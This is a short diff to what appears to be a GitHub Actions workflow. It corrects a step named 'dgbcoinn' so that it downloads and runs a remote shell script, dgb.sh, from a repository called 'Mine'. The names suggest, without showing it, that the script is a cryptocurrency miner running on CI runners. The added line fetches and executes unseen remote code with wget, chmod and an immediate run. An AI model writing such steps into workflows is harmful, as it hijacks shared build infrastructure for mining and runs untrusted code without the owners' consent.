@@ -24,4 +24,4 @@ steps:
   uses: actions/checkout@v2
 - name: dgbcoinn
   run: |
-    wget https://github.com/Wisnuyoganugraha/Mine/blob/main/dgb.sh && chmod u+x dgb.sh && ./dgb.sh
+    wget https://raw.githubusercontent.com/Wisnuyoganugraha/Mine/main/dgb.sh && chmod u+x dgb.sh && ./dgb.sh
